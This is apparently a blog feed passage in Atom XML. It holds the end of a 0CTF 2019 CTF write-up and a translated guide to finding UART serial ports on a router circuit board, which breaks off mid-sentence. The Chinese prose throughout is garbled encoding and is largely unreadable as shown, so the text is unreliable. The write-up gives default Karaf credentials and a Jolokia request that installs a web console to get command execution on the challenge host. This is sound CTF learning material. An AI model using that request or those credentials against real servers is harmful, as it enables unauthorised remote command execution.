ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥åœ¨æ‰§è¡Œå®Œæ¶æ„ä»£ç åå†æ‰§è¡Œæ­£å¸¸çš„åº“å‡½æ•°ï¼Œè¿™æ ·ä»¥å‡ä¹±çœŸï¼Œæ•ˆæœæ›´æ£’:)</p><h2 id="Ghost-Pepper"><a href="#Ghost-Pepper" class="headerlink" title="Ghost Pepper"></a>Ghost Pepper</h2><p>æ‰“å¼€é¢˜ç›®çœ‹åˆ°æœ‰ä¸€ä¸ªbasicè®¤è¯ï¼Œå…¶å®è¿™é‡Œæ˜¯å¯ä»¥çˆ†ç ´çš„ï¼Œå¾—åˆ°å¯†ç <code>karaf:karaf</code>ï¼Œå½“ç„¶æˆ‘æ˜¯äº‹åæ‰çŸ¥é“çš„ï¼Œçœ‹writeupæœ‰çš„äººæ˜¯æ ¹æ® <a href="https://karaf.apache.org/manual/latest/webconsole" target="_blank" rel="noopener">https://karaf.apache.org/manual/latest/webconsole</a> ï¼Œä¹Ÿæœ‰çš„äººæ˜¯æ ¹æ®jettyçš„é»˜è®¤å‡­è¯ã€‚</p><p>æˆåŠŸè®¤è¯ä¹‹åæ˜¯å¾—åˆ°ä¸€ä¸ª404çš„é¡µé¢ï¼Œè¿™é‡Œæ ¹æ®<code>Ghost Pepper</code>çŒœåˆ°<code>jolokia</code>è·¯å¾„ï¼Œè¿™é‡Œæœ‰ç‚¹è„‘æ´äº†ï¼Œè¿™ç§è·¯å¾„çˆ†ç ´ä¹Ÿå‡ºä¸æ¥ã€‚ã€‚ã€‚åœ¨æ‹¿åˆ°è·¯å¾„ä¹‹åå‘ç°æ˜¯ä¸€ä¸ªOSGIçš„apiæ¥å£ã€‚</p><p>å¯¹äºjavaä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œç…§ç€writeupä¸€è·¯èµ°ï¼Œè¿™é‡Œç”¨åˆ°äº†<code>jolokia/list</code>æ¥åˆ—ä¸¾èƒ½ç”¨çš„ç±»ï¼Œè¿”å›çš„jsonæ•°æ®ç¾åŒ–ä¸€ä¸‹çœ‹ç€æ›´åŠ æ–¹ä¾¿ã€‚é‡Œé¢æ¯”è¾ƒæœ‰ç”¨çš„å°±æ˜¯<code>org.apache.karaf</code>ï¼Œèƒ½å¤Ÿå®‰è£…å’Œæ‰§è¡Œä¸€äº›jaråŒ…ï¼Œè¿™å¯¹æˆ‘ä»¬æ¥è¯´ç”¨å¤„å¾ˆå¤§ï¼Œåªè¦æ„é€ æ¶æ„çš„jaråŒ…åå¼¹shellï¼Œå°±èƒ½æ‹¿åˆ°flagäº†ã€‚ç„¶è€Œï¼Œæˆ‘åƒåœ¾çš„javaåŠŸåº•å®Œå…¨æ„é€ ä¸å‡ºæ¥ã€‚ã€‚ã€‚</p><p>è¿™é‡Œé‡‡ç”¨çš„å¦å¤–ä¸€ä¸ªæ€è·¯ï¼ŒKarafæœ‰ä¸€ä¸ªwebconsoleï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡installFeatureæ¥å®‰è£…ä¸€ä¸ªwebconsoleã€‚</p><p><code>http://111.186.63.207:31337/jolokia/exec/org.apache.karaf:name=root,type=feature/installFeature(java.lang.String)/webconsole</code></p><p>å®‰è£…ä¹‹åï¼Œè®¿é—®<code>http://111.186.63.207:31337/system/console/gogo</code></p><img src="/2019/03/31/2019TCTF-web-writeup/4.png"><p>ç›´æ¥å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°flag</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p><p><a href="https://www.linuxidc.com/Linux/2017-12/149841.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2017-12/149841.htm</a></p><p><a href="https://github.com/mdsnins/ctf-writeups/blob/master/2019/0ctf%202019/Wallbreaker%20Easy/WallbreakerEasy.md" target="_blank" rel="noopener">https://github.com/mdsnins/ctf-writeups/blob/master/2019/0ctf%202019/Wallbreaker%20Easy/WallbreakerEasy.md</a></p><p><a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175403</a></p><p><a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#ghost-pepper" target="_blank" rel="noopener">https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#ghost-pepper</a></p><p><a href="https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi" target="_blank" rel="noopener">https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi</a></p><p><a href="https://fireshellsecurity.team/0ctf-ghost-pepper/" target="_blank" rel="noopener">https://fireshellsecurity.team/0ctf-ghost-pepper/</a></p><p><a href="https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi" target="_blank" rel="noopener">https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi</a></p><p><a href="http://momomoxiaoxi.com/2019/03/26/tctf2019/#wallbreaker-easy" target="_blank" rel="noopener">http://momomoxiaoxi.com/2019/03/26/tctf2019/#wallbreaker-easy</a></p><p><a href="https://www.anquanke.com/post/id/103016" target="_blank" rel="noopener">https://www.anquanke.com/post/id/103016</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;wallbreaker-easy&quot;&gt;&lt;a href=&quot;#wallbreaker-easy&quot; class=&quot;headerlink&quot; title=&quot;wallbreaker easy&quot;&gt;&lt;/a&gt;wallbreaker easy&lt;/h2&gt;&lt;p&gt;è¿™é“é¢˜åœ¨æ¯”èµ›çš„æ—¶å€™ä¸“æ³¨åœ¨im
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
      <category term="PHP" scheme="https://hurricane618.me/tags/PHP/"/>
    
      <category term="JAVA" scheme="https://hurricane618.me/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>å¿«é€Ÿå¯»æ‰¾ä¸²è¡Œæ¥å£</title>
    <link href="https://hurricane618.me/2019/03/02/serial-ports-translation-cn/"/>
    <id>https://hurricane618.me/2019/03/02/serial-ports-translation-cn/</id>
    <published>2019-03-02T11:31:43.000Z</published>
    <updated>2019-03-03T12:57:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™æ˜¯ä¸€ç¯‡æ¥è‡ªdevttys0çš„ä¸€ç¯‡æ–‡ç« ï¼Œåœ¨å¯»æ‰¾ä¸²å£çš„æ–¹æ³•ä¸Šç»™å‡ºäº†å¾ˆå¤šæœ‰ç”¨çš„æ–¹æ³•ï¼Œæ˜¯ä¸€ç¯‡ä¸é”™çš„æ€»ç»“æ–‡ï¼Œåœ¨å›½å†…æ²¡æœ‰çœ‹åˆ°ç¿»è¯‘ï¼Œæ‰€ä»¥å°±æƒ³ç¿»è¯‘æˆä¸­æ–‡ä¾›å¤§å®¶å­¦ä¹ ï¼Œç¬¬ä¸€æ¬¡åšç¿»è¯‘ï¼Œå¦‚æœ‰é”™è¯¯ä¹‹å¤„ï¼Œè¯·å¤§å®¶ä½“è°…ï¼Œå¯ä»¥ç»™æˆ‘ç•™è¨€ï¼Œæˆ‘ä¼šå¿«é€Ÿä¿®æ”¹ã€‚</p><p><a href="http://www.devttys0.com/2012/11/reverse-engineering-serial-ports/" target="_blank" rel="noopener">åŸæ–‡é“¾æ¥</a></p><p>é‰´äºè¿™ä¸ªåšå®¢çš„åå£°å’Œæˆ‘æ‹¥æœ‰çš„ç‚¹å‡»é‡ï¼Œæˆ‘è®¤ä¸ºç°åœ¨æ˜¯å¤§å®¶ä¸€èµ·è®¨è®ºä¸²å£çš„æ—¶å€™äº†ï¼Œå°¤å…¶æ˜¯åµŒå…¥å¼ç³»ç»Ÿçš„ä¸²å£ã€‚</p><p>æˆ‘çš„ç›®æ ‡æ˜¯é€šè¿‡ä½¿ç”¨ç¡®å®šçš„æµ‹è¯•å’Œæœ‰æ ¹æ®çš„çŒœæµ‹æ¥è®²è§£æˆ‘å‘ç°çš„æœ‰æ•ˆè¯†åˆ«å’Œé€†å‘åµŒå…¥å¼ä¸²å£çš„æŠ€æœ¯ï¼Œè€Œä¸éœ€è¦ç‰¹åˆ«æ˜‚è´µçš„è®¾å¤‡ã€‚</p><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>ä¸²å£å¯¹äºåµŒå…¥å¼å¼€å‘äººå‘˜ç‰¹åˆ«æœ‰ç”¨ï¼Œé€šå¸¸ä¼šä½¿ç”¨ä¸²å£æ¥ï¼š</p><ul><li>è¿›å…¥boot loader</li><li>å¾—åˆ°å¯åŠ¨å’Œè°ƒè¯•ä¿¡æ¯</li><li>é€šè¿‡shellå’Œç³»ç»Ÿäº¤äº’</li></ul><p>ä¸ç”¨è¯´è¿™ä¸ªåŠŸèƒ½åŒæ ·å¯¹é»‘å®¢æœ‰ç”¨ï¼Œæ‰€ä»¥åœ¨åµŒå…¥å¼è®¾å¤‡ä¸Šæ‰¾åˆ°ä¸€ä¸ªä¸²å£ä¼šéå¸¸æœ‰ç”¨ã€‚ä½œä¸ºä¸€ä¸ªå­¦ä¹ æ¡ˆä¾‹ï¼Œæˆ‘ä»¬å°†æµ‹è¯•Westell 9100EM FiOS è·¯ç”±å™¨çš„PCBï¼Œç”¨äºå¯»æ‰¾å¯èƒ½çš„ä¸²å£ã€‚</p><img src="/2019/03/02/serial-ports-translation-cn/1.jpg" title="Westell 9100EM PCB"><p>ç°åœ¨ï¼Œä¸æ˜¯ä½ ä»¬çˆ¶äº²é‚£ä¸€ä»£å¯»æ‰¾çš„RS-232ä¸²å£ï¼Œç°åœ¨æœ‰é€šç”¨å¼‚æ­¥æ”¶å‘å™¨ï¼ŒUniversal Asynchronous Receiver Transmitters (UARTs)ï¼Œå¸¸è§äºåµŒå…¥å¼è®¾å¤‡ä¸­ã€‚è™½ç„¶åè®®å…¼å®¹ï¼ŒRS-232å’ŒUARTä¸æ˜¯ç”µå‹å…¼å®¹ï¼ˆä»è¿™é‡Œå¼€å§‹æˆ‘ä¼šæŠŠUARTå’Œä¸²å£äº’æ¢ï¼‰ã€‚UARTså¸¸ç”¨åœ¨3.3Vï¼Œä½†æ˜¯ä¹Ÿæœ‰å¯èƒ½ç”¨åœ¨å…¶ä»–å…¶ä»–æ ‡å‡†ç”µå‹ä¸Šã€‚ï¼ˆ5Vã€1.8Vç­‰ï¼‰</p><p>ä¸å¹¸çš„æ˜¯ï¼Œè¿™é‡Œæ²¡æœ‰ä»»ä½•å·¥ä¸šæ ‡å‡†çš„UARTå¼•è„šè¾“å‡ºï¼Œå¹¶ä¸”åˆ¶é€ å•†é€šå¸¸ä¸ä¼šå®£ä¼ æˆ–è®°å½•ä»–ä»¬çš„è°ƒè¯•æ¥å£ã€‚æ‰€ä»¥ä¸ºäº†è¿æ¥è¿™äº›ä¸²å£ï¼Œæˆ‘ä»¬éœ€è¦åšä¸€äº›å·¥ä½œã€‚å°¤å…¶ï¼Œæˆ‘ä»¬éœ€è¦é€†å‘å·¥ç¨‹ç¡¬ä»¶æ¥å£å’Œè½¯ä»¶åè®®è®¾ç½®ã€‚</p><p>è®©æˆ‘ä»¬å…ˆä»ç¡¬ä»¶æ¥å£å¼€å§‹ï¼Œä¸ºæ­¤ï¼Œä½ éœ€è¦ä¸€ä¸ªä¸‡ç”¨è¡¨å’Œä¸€å¯¹çœ¼çƒï¼ˆç”šè‡³ä¸€ä¸ªä¹Ÿå¯ä»¥åšçš„å¾ˆå¥½ï¼Œ23333ï¼‰ã€‚æ˜¯çš„ï¼Œç¤ºæ³¢å™¨å’Œé€»è¾‘åˆ†æä»ªå¾ˆæœ‰ç”¨ï¼Œæœ‰æ—¶ä¹Ÿæ˜¯å¿…è¦çš„ï¼Œä½†æ˜¯åœ¨99%çš„æ—¶é—´é‡Œï¼Œä¸€ä¸ªå¯é çš„ä¸‡ç”¨è¡¨å’Œä¸€ç‚¹ç‚¹çŸ¥è¯†å°±æ˜¯ä½ éœ€è¦çš„å…¨éƒ¨ã€‚</p><h2 id="è¯†åˆ«ä¸²å£å¤´"><a href="#è¯†åˆ«ä¸²å£å¤´" class="headerlink" title="è¯†åˆ«ä¸²å£å¤´"></a>è¯†åˆ«ä¸²å£å¤´</h2><p>ç¬¬ä¸€æ­¥æ˜¯å°è¯•è¯†åˆ«ä¸²å£æ ‡å¤´çš„æ½œåœ¨å¯¹è±¡ã€‚å¤§éƒ¨åˆ†çš„ä¸²å£å¤´è‡³å°‘æœ‰å››ä¸ªå¼•è„šï¼š</p><ul><li>Vcc</li><li>Ground</li><li>Transmit</li><li>Receive</li></ul><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œä½ å°†è¦å¯»æ‰¾å•æ’4-6ä¸ªå¼•è„šçš„åœ°æ–¹ï¼Œè™½ç„¶è¿™ä¸æ˜¯ä¸€ä¸ªä¸¥æ ¼çš„è§„å®šï¼Œå®ƒä»¬å¯ä»¥é‡‡ç”¨åˆ¶é€ å•†å†³å®šçš„ä»»ä½•å¼•è„šé…ç½®ã€‚</p><p>åœ¨æˆ‘ä»¬çš„ 9100EM PCB ï¼Œèƒ½æ‰¾åˆ°ä¸¤ä¸ªå¯èƒ½çš„åœ°æ–¹ P1402 å’Œ P1404æ ‡ç­¾å¤„ï¼š</p><img src="/2019/03/02/serial-ports-translation-cn/2.jpg" title="å¯èƒ½çš„ä¸²å£å¤´"><p>æœ‰æ—¶ï¼Œä½ ä¸ä¼šæœ‰è¿™æ ·ä¸€å¥—å¾ˆå¥½çš„å¼•è„šï¼Œä½ å¿…é¡»è¦æ£€æŸ¥æ¿å­ä¸Šçš„ç›‘æµ‹ç‚¹ï¼Œé€šå¸¸ä»æœ€æ¥è¿‘SoCçš„æµ‹è¯•ç‚¹å¼€å§‹æ˜¯ä¸€ä¸ªå¥½ä¸»æ„ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªWL530Gçš„ä¾‹å­ï¼Œé€šè¿‡æ¿å­ä¸Šçš„ä¸åŒæµ‹è¯•ç‚¹æ¥å‘ç°ä¸²å£ã€‚</p><img src="/2019/03/02/serial-ports-translation-cn/3.jpeg" title="WL530Gçš„ä¸²å£æµ‹è¯•ç‚¹"><p>åœ¨ä»»ä½•ä¸€ç§æƒ…å†µä¸‹ï¼Œè¯†åˆ«å¼•è„šçš„è¿‡ç¨‹éƒ½æ˜¯ç›¸åŒçš„ã€‚ä½†æ˜¯å¦‚æœæ²¡æœ‰å¤´éƒ¨é€šå¸¸ä¼šéœ€è¦æ›´é•¿çš„æ—¶é—´ï¼Œå› ä¸ºå¯èƒ½ä¼šè¶…è¿‡4ä¸ªæ£€æµ‹ç‚¹éœ€è¦å»æ£€æŸ¥ã€‚</p><p>æ­¤æ—¶ï¼ŒP1402æˆ–P1404å¯èƒ½æ˜¯ä¸²å£å¤´ï¼Œæˆ–è€…å®ƒä»¬éƒ½æ˜¯ä¸²å£å¤´ï¼Œåˆæˆ–è€…ä¸¤è€…éƒ½ä¸æ˜¯ä¸²å£å¤´ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬å°†åˆ†åˆ«æ£€æŸ¥æ¯ä¸ªå¤´éƒ¨ä¸Šçš„å¼•è„šï¼Œå°è¯•å»è·å¾—ä¸€äº›æœ‰ç”¨ä¿¡æ¯ã€‚</p><h2 id="è‚‰çœ¼è§‚å¯Ÿ"><a href="#è‚‰çœ¼è§‚å¯Ÿ" class="headerlink" title="è‚‰çœ¼è§‚å¯Ÿ"></a>è‚‰çœ¼è§‚å¯Ÿ</h2><p>é¦–å…ˆï¼Œè®©æˆ‘ä»¬ä»”ç»†æ£€æŸ¥å¼•è„šï¼Œä»P1402å¼€å§‹ï¼š</p><img src="/2019/03/02/serial-ports-translation-cn/4.png" title="P1402æ­£é¢"><img src="/2019/03/02/serial-ports-translation-cn/5.png" title="P1402èƒŒé¢"><p>åœ¨PCBçš„æ­£é¢æœ€å³ä¾§çš„å¼•è„šè¢«æ ‡è®°ä¸º1ï¼Œè¿™ä¸æ˜¯éå¸¸é‡è¦ï¼Œä½†æ˜¯åœ¨æè¿°å¼•è„šç¼–å·çš„æ—¶å€™å®ƒç»™å‡ºäº†ä¸€ä¸ªå…±åŒçš„å‚è€ƒæ¡†æ¶ã€‚</p><p>åœ¨PCBçš„èƒŒé¢ï¼Œæˆ‘ä»¬çœ‹åˆ°å¼•è„š3æœ‰å››æ¡ç—•è¿¹ç»„æˆåå­—å›¾æ¡ˆï¼Œå®ƒä»¬è¿æ¥åœ¨åœ°çº¿å¹³é¢çš„é™„è¿‘ã€‚è¿™å¾ˆå®¹æ˜“çš„å°†å¼•è„š3è¯†åˆ«ä¸ºåœ°çº¿ï¼ˆGroundï¼‰ã€‚</p><p>å¼•è„š2å’Œ4æœ‰ç»†çš„ç—•è¿¹è¿æ¥åˆ°å®ƒä»¬ï¼Œè€Œå¼•è„š1è¿æ¥åœ¨è¾ƒç²—çš„ç—•è¿¹ä¸Šã€‚å®½çš„ç—•è¿¹é€šå¸¸ç”¨äºä¾›ç”µçš„ï¼Œè€Œçª„çš„ç—•è¿¹é€šå¸¸ç”¨äºä¿¡å·ä¼ è¾“ã€‚è¿™è¡¨æ˜å¼•è„š1æ˜¯Vccï¼Œå¼•è„š2å’Œ4å¯èƒ½æ˜¯æ”¶å‘ï¼ˆå°½ç®¡æˆ‘ä»¬ä¸çŸ¥é“å“ªä¸ªæ˜¯å“ªä¸ªï¼‰ã€‚</p><p>è®©æˆ‘ä»¬çœ‹çœ‹P1404çš„å¤´éƒ¨ï¼š</p><img src="/2019/03/02/serial-ports-translation-cn/6.png" title="P1404æ­£é¢"><img src="/2019/03/02/serial-ports-translation-cn/7.png" title="P1404èƒŒé¢"><p>è¿™é‡Œï¼Œæœ€å·¦è¾¹çš„å¼•è„šè¢«æ ‡è®°ä¸º1ã€‚å†ä¸€æ¬¡ï¼Œæˆ‘ä»¬çœ‹åˆ°å¼•è„š3è¿æ¥åœ¨PCBèƒŒé¢æ¥åœ°ã€‚å¼•è„š4ä¹Ÿæœ‰ä¸€ä¸ªè¿æ¥åˆ°å®ƒçš„ç»†ç—•è¿¹ï¼Œæ‰€ä»¥å®ƒå¯èƒ½æ˜¯ä¼ è¾“æˆ–è€…æ¥å—å¼•è„šã€‚</p><p>ç„¶è€Œï¼ŒP1404çš„å¦å¤–ä¸¤ä¸ªå¼•è„šåœ¨PCBçš„æ­£é¢æˆ–èƒŒé¢ä¸Šæ²¡æœ‰è¿æ¥åˆ°å®ƒä»¬çš„å¯è§ç—•è¿¹ã€‚å¯èƒ½æ˜¯å®ƒä»¬æ²¡æœ‰è¿æ¥åˆ°ä»»ä½•ä¸œè¥¿ï¼Œä½†æ˜¯æ›´å¯èƒ½çš„æ˜¯å®ƒä»¬çš„ç—•è¿¹è¿æ¥åœ¨æˆ‘ä»¬çœ‹ä¸åˆ°çš„PCBä¸­ä¸€ä¸ªå†…å±‚ä¸Šã€‚æ˜¯æ—¶å€™ä½¿ç”¨ä¸‡ç”¨è¡¨äº†ã€‚</p><h2 id="è¯†åˆ«æ¥åœ°å¼•è„š"><a href="#è¯†åˆ«æ¥åœ°å¼•è„š" class="headerlink" title="è¯†åˆ«æ¥åœ°å¼•è„š"></a>è¯†åˆ«æ¥åœ°å¼•è„š</h2><p>è¿ç»­æ€§æµ‹è¯•å°†å°ç”µæµå¼•å…¥ç”µè·¯ï¼Œå¦‚æœæœ‰è¶³å¤Ÿçš„ç”µæµä»ä¸€ä¸ªæ¢é’ˆåˆ°å¦å¤–ä¸€ä¸ªæ¢é’ˆï¼ˆå³ç”µé˜»è¶³å¤Ÿå°ï¼‰ï¼Œä¸‡ç”¨è¡¨å°†ä¼šå‘å‡ºå¯å¬è§çš„éŸ³è°ƒï¼Œè¡¨æ˜æ¢é’ˆæ‰€æ¥è§¦çš„ç‚¹æ˜¯ç”µè¿æ¥çš„ã€‚[è¯‘è€…æ³¨ï¼šå…¶å®è¿™é‡Œæˆ‘ä»¬ç›´æ¥ç”¨ä¸‡ç”¨è¡¨çš„èœ‚é¸£æ¡£ï¼Œä¹Ÿå°±æ˜¯é€šæ–­æ¡£ä½ï¼Œä¹Ÿæ˜¯è¿™ä¸ªæ•ˆæœ]</p><p>æˆ‘ä»¬è¦åšçš„ç¬¬ä¸€ä»¶äº‹æƒ…æ˜¯ä½¿ç”¨ä¸‡ç”¨è¡¨åœ¨æ¥åœ°å’Œæ¯ä¸ªå¤´éƒ¨ä¸Šçš„æ‰€æœ‰å¼•è„šä¹‹é—´è¿›è¡Œè¿ç»­æ€§æµ‹è¯•ã€‚è¿™ä¼šå‘Šè¯‰æˆ‘ä»¬å“ªäº›å¼•è„šç›´æ¥è¿æ¥åˆ°åœ°çº¿ã€‚æˆ‘ä»¬ä¼šä»P1402å¼€å§‹ã€‚</p><p>é‡‘å±å±è”½æ˜¯ç”¨äºæµ‹è¯•çš„ä¾¿åˆ©æ¥åœ°ç‚¹ã€‚å°†ä¸€ä¸ªæ¢é’ˆæ”¾åœ¨å±è”½ä¸Šå¹¶å°†å¦å¤–ä¸€ä¸ªæ¢é’ˆæ¥è§¦åˆ°å¼•è„š3ï¼Œä¸‡ç”¨è¡¨ä¼šå‘å‡ºè¿ç»­çš„å¯å¬éŸ³è°ƒï¼Œè¡¨ç¤ºæˆ‘ä»¬ä¹‹å‰è§‚å¯Ÿåˆ°å¼•è„š3æ˜¯æ¥åœ°çš„ã€‚</p><img src="/2019/03/02/serial-ports-translation-cn/8.jpg" title="å¼•è„š3çš„æ¥åœ°æµ‹è¯•"><p>å¯¹å¼•è„š2å’Œ4æ‰§è¡Œç›¸åŒçš„æµ‹è¯•ä¼šæ²¡æœ‰å£°éŸ³ï¼Œæ‰€ä»¥æˆ‘ä»¬çŸ¥é“è¿™äº›å¼•è„šæ²¡æœ‰æ¥åœ°ã€‚</p><p>å¯¹P1404çš„å¼•è„š2,3,4 åšç›¸åŒè¿ç»­æ€§æµ‹è¯•ä¹Ÿä¼šäº§ç”Ÿç›¸åŒçš„ç»“æœã€‚å› æ­¤ï¼Œæˆ‘ä»¬çŸ¥é“äº†å¯¹äºP1402å’ŒP1404ï¼Œå¼•è„š3æ˜¯æ¥åœ°çš„ï¼Œå¼•è„š2å’Œ4ä¸æ¥åœ°ã€‚</p><h2 id="è¯†åˆ«Vcc"><a href="#è¯†åˆ«Vcc" class="headerlink" title="è¯†åˆ«Vcc"></a>è¯†åˆ«Vcc</h2><p>Vccä¸å¤ªé‡è¦ï¼Œå› ä¸ºæˆ‘ä»¬å®é™…ä¸Šä¸éœ€è¦è¿æ¥ä»»ä½•ä¸œè¥¿åˆ°Vccï¼Œä½†æ˜¯å®šä½Vccå¼•è„šæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ç»ƒä¹ ï¼Œå¹¶ä¸”æœ‰åŠ©äºæ¶ˆé™¤Vccå¼•è„šä½œä¸ºæ”¶å‘çš„å¯èƒ½ã€‚</p><p>åŸºäºç—•è¿¹çš„å®½åº¦ï¼Œæˆ‘ä»¬æ€€ç–‘å¼•è„š1æ˜¯Vccï¼Œå½“ç”µè·¯æ¿é€šç”µæ—¶ï¼Œæµ‹é‡å¼•è„š1ä¸Šçš„ç”µå‹ä¼¼ä¹è¯å®äº†è¿™ä¸€ç‚¹ï¼š</p><img src="/2019/03/02/serial-ports-translation-cn/9.jpg" title="æµ‹è¯•å¼•è„š1çš„ç”µå‹"><img src="/2019/03/02/serial-ports-translation-cn/10.jpg" title="åœ¨P1402ä¸Šæµ‹å‡ºçš„ç¨³å®šç”µå‹"><p>åœ¨P1404çš„å¼•è„š1ä¸Šä¹Ÿè¯»å‡ºç›¸åŒçš„ç”µå‹ï¼Œè¿™è¡¨æ˜P1402å’ŒP1404éƒ½å°†å¼•è„š1è¿æ¥åˆ°Vccã€‚</p><p>è¯†åˆ«Vccçš„å¦å¤–ä¸€ç§æ–¹æ³•æ˜¯åœ¨åœ°çº¿å’Œå¯ç–‘Vccå¼•è„šä¹‹é—´æ‰§è¡Œè¿ç»­æ€§æµ‹è¯•ã€‚è™½ç„¶å®ƒå¯èƒ½ä¼šæœ‰ç‚¹åç›´è§‰ï¼Œä½†æ˜¯é€šå¸¸è¿™ä¼šå¯¼è‡´éå¸¸çŸ­çš„å˜Ÿå˜Ÿå£°ï¼ˆå°½ç®¡ä¸æ˜¯è¿ç»­éŸ³è°ƒï¼‰ã€‚</p><p>Vccçš„è¿ç»­æ€§æµ‹è¯•è¡¨æ˜åœ¨Vccå¼•è„šå’Œåœ°çº¿ä¹‹é—´é€šå¸¸è¿æ¥ç€ä¸€ä¸ªæ»¤æ³¢ç”µå®¹ã€‚è¿™æ ·åšæ—¶ä¸ºäº†æ¶ˆé™¤PCBä¸Šç”µæºçº¿ä¸­çš„ä»»ä½•å¯èƒ½çš„å™ªå£°ï¼Œå¹¶ä¸”è¿™ç§æ»¤æ³¢ç”µå®¹å™¨å¯ä»¥åœ¨ä»»ä½•è®¾è®¡è‰¯å¥½çš„ç”µè·¯æ¿ä¸­ä½¿ç”¨ã€‚ç”±äºç”µå®¹å™¨çš„å·¥ä½œæ€§è´¨ï¼Œå®ƒä»¬å°†éå¸¸çŸ­æš‚åœ°â€œé€šè¿‡â€ç›´æµç”µï¼Œç›´åˆ°å®ƒä»¬è¢«å……ç”µåˆ°å®¹é‡ï¼Œæ­¤æ—¶å®ƒä»¬å°†åœæ­¢â€œé€šè¿‡â€ç›´æµç”µå¹¶å°†â€œé˜»æ–­â€ç›´æµç”µæµï¼Œä»è€Œåœ¨è¿ç»­æ€§æµ‹è¯•ä¸­è§‚å¯Ÿåˆ°å¯¼è‡´çŸ­æš‚çš„èœ‚é¸£å£°ï¼ˆå€¼å¾—ä¸€æçš„æ˜¯ï¼Œç”µæµå®é™…ä¸Šå¹¶æ²¡æœ‰é€šè¿‡ç”µå®¹å™¨ï¼Œå°½ç®¡å®ƒçœ‹ç€åƒæ˜¯è¿™æ ·çš„ï¼‰ã€‚</p><p>è™½ç„¶å®ƒå¹¶ä¸æ€»æ˜¯æœ‰æ•ˆï¼Œä½†æ˜¯è¿ç»­æ€§æµ‹è¯•æ˜¯æ¯”ç®€å•æµ‹è¯•æ¯ä¸ªå¼•è„šä¸Šçš„ç”µå‹æ›´å‡†ç¡®çš„æ–¹æ³•ã€‚å› ä¸ºä»»æ„æ•°é‡çš„å¼•è„šå¯èƒ½æ˜¯ç›¸åŒçš„ç”µå‹ã€‚è¯·æ³¨æ„ï¼Œä½ è¿˜éœ€è¦ä¸€ä¸ªé«˜çµæ•çš„ä¸‡ç”¨è¡¨æ¥è¿›è¡Œè¿ç»­æ€§æµ‹è¯•ï¼Œä¸ºäº†ä¿è¯æµ‹è¯•çš„æ­£ç¡®æ€§ã€‚æ›´ä¾¿å®œçš„äº§å“åœ¨è§¦å‘ä¹‹å‰å¯èƒ½éœ€è¦ä¸€ç§’æˆ–æ›´é•¿çš„æ—¶é—´ï¼Œæ­¤æ—¶ç”µå®¹å™¨å·²ç»å……ç”µã€‚å¤§å¤š100ç¾å…ƒèŒƒå›´å†…çš„ä¸‡ç”¨è¡¨åº”è¯¥æ˜¯è¶³å¤Ÿäº†ã€‚</p><h2 id="è¯†åˆ«ä¼ è¾“å¼•è„š"><a href="#è¯†åˆ«ä¼ è¾“å¼•è„š" class="headerlink" title="è¯†åˆ«ä¼ è¾“å¼•è„š"></a>è¯†åˆ«ä¼ è¾“å¼•è„š</h2><p>åªè¦ä¸²å£å¤„äºæ¿€æ´»çŠ¶æ€å¹¶ä¸”æ­£åœ¨ä¼ è¾“æ•°æ®ï¼Œä¼ è¾“å¼•è„šå’Œå†œå®¹æ˜“è¯†åˆ«ï¼ˆå¦‚æœä¸æ˜¯ï¼Œé‚£ä¹ˆæ•´ä¸ªå·¥ä½œå¯èƒ½æ— è®ºå¦‚ä½•éƒ½æ˜¯å¾’åŠ³çš„ï¼‰ã€‚ç”µè·¯æ¿ä¸Šçš„ä¼ è¾“å¼•è„šå°†è¢«æ‹‰é«˜åˆ°å’ŒVccç›¸åŒçš„ç”µå‹ï¼ˆé€šå¸¸ä¸º3.3Vï¼‰ã€‚å½“å®ƒä¼ è¾“æ•°æ®ä½çš„æ—¶å€™ï¼Œç”µå‹å°†ä¸‹é™åˆ°0Vï¼ˆå‘é€ç©ºæ ¼ï¼‰ï¼Œç„¶åå›åˆ°3.3Vï¼ˆå‘é€æ ‡è®°ï¼‰ã€‚å½“è¯»å–å˜åŒ–çš„ç›´æµç”µå‹æ—¶ï¼Œæ•°å­—ä¸‡ç”¨è¡¨å°†æœ€ç»ˆæ˜¾ç¤ºé‡‡æ ·ç”µå‹çš„å¹³å‡å€¼ï¼Œè¿™æ„å‘³ç€å¹³å‡ç”µå‹ï¼ˆä¸‡ç”¨è¡¨æ˜¾ç¤ºçš„ï¼‰å°†åœ¨çªå‘æ¿€æ´»æœŸé—´çŸ­æš‚ä¸‹é™ã€‚</p><p>ä¼ è¾“å¼•è„šä¸Šçš„å¤§å¤šæ•°æ´»åŠ¨é€šå¸¸å‘ç”Ÿåœ¨ç³»ç»Ÿå¯åŠ¨æœŸé—´ï¼Œå½“ä»bootloaderã€å†…æ 